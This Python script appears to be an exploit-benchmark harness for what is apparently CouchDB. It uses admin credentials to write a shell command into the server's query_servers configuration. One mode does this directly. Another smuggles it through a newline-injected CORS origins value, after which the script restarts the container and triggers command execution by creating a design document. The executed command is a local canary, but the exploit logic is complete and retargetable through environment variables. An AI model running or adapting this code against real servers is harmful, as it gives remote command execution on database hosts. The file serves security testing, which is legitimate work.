#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
import argparse
import json
import os
import random
import string
import subprocess
import sys
import time
from pathlib import Path
import requests
NODE = "/_node/nonode@nohost/_config"
USER, PW = "admin", "pocpass"
BASE = {
    "v0": f"http://{USER}:{PW}@127.0.0.1:45984",
    "v1": f"http://{USER}:{PW}@127.0.0.1:45985",
}
def new_flag():
    return os.environ.get("PCB_FLAG") or "PCBFLAG_UNSET"
X = os.environ.get("PCB_X") or new_flag()
HERE = Path(__file__).resolve().parent
def run_probe(candidate, *, version="v1"):
    
    base = BASE[version]
    mode = candidate.get("mode", "direct") if isinstance(candidate, dict) else str(candidate)
    outfile = candidate.get("outfile", "out.txt") if isinstance(candidate, dict) else "out.txt"
    cmd = _cmd(outfile)
    result = {"version": version, "mode": mode, "outfile": outfile}
    _clear_out(version, outfile)
    try:
        if mode == "direct":
            
            r = requests.put(f"{base}{NODE}/query_servers/pcbqs",
                             data=json.dumps(cmd), timeout=20)
            result["config_put_status"] = r.status_code
            result["config_put_body"] = r.text[:160]
        elif mode == "newline_inject":
            
            sec = candidate.get("carrier_section", "cors")
            key = candidate.get("carrier_key", "origins")
            inj = "http://pcb.example\n\n[query_servers]\npcbqs = %s\n" % cmd
            r = requests.put(f"{base}{NODE}/{sec}/{key}", data=json.dumps(inj), timeout=20)
            result["config_put_status"] = r.status_code
            result["config_put_body"] = r.text[:160]
            if r.status_code == 200:
                
                result["restarted"] = True
                _compose_restart(version)
        else:
            result["error"] = f"unknown mode {mode}"
            return result
        result["trigger"] = _spawn_query_server(base, outfile)
        
        for _ in range(8):
            if _read_out(version, outfile):
                break
            time.sleep(1)
        result["exfil"] = _read_out(version, outfile).strip()
    except Exception as e:  
        result["error"] = f"{type(e).__name__}: {e}"
    return result
def _compose_restart(version: str) -> None:
    _compose("--profile", version, "restart", version, env={"PCB_X": X})
    _wait_ready(version)
def _spawn_query_server(base: str, outfile: str) -> dict:
    
    info = {}
    db = f"{base}/trig_{_rand()}"
    r = _retry(lambda: requests.put(db, timeout=20),
               lambda r: getattr(r, "status_code", 0) in (201, 412))
    info["db_create"] = getattr(r, "status_code", str(r))
    ddoc = {"language": "pcbqs", "views": {"v": {"map": "function(doc){emit(1,1)}"}}}
    try:
        rr = requests.put(f"{db}/_design/d_{_rand()}", json=ddoc, timeout=10)
        info["ddoc_put"] = rr.status_code
    except Exception as e:  
        info["ddoc_put"] = f"{type(e).__name__}"
    try:
        requests.delete(db, timeout=10)  
    except Exception:
        pass
    return info
def _cmd(outfile: str) -> str:
    return f"/pcb/qs_canary.sh /pcb_out/{outfile}"
def _clear_out(version: str, outfile: str) -> None:
    p = _outpath(version, outfile)
    try:
        p.unlink()
    except FileNotFoundError:
        pass
def _read_out(version: str, outfile: str) -> str:
    p = _outpath(version, outfile)
    try:
        return p.read_text(errors="replace")
    except FileNotFoundError:
        return ""
def _wait_ready(version: str, tries: int = 120) -> bool:
    
    base = BASE[version]
    good = 0
    for _ in range(tries):
        try:
            if requests.get(f"{base}{NODE}/query_servers", timeout=8).status_code == 200:
                probe_db = f"{base}/ready_{_rand()}"
                c = requests.put(probe_db, timeout=10).status_code
                if c in (201, 412):
                    requests.delete(probe_db, timeout=10)
                    good += 1
                    if good >= 2:
                        return True
                    time.sleep(2)
                    continue
        except Exception:
            pass
        good = 0
        time.sleep(4)
    return False
def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False, env={**os.environ, **(env or {})},
    )
def _retry(fn, ok, tries=30, delay=1.5):
    last = None
    for _ in range(tries):
        try:
            last = fn()
            if ok(last):
                return last
        except Exception as e:  
            last = e
        time.sleep(delay)
    return last
def _rand(n: int = 6) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
def _outpath(version: str, outfile: str) -> Path:
    return HERE / "_out" / version / outfile


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))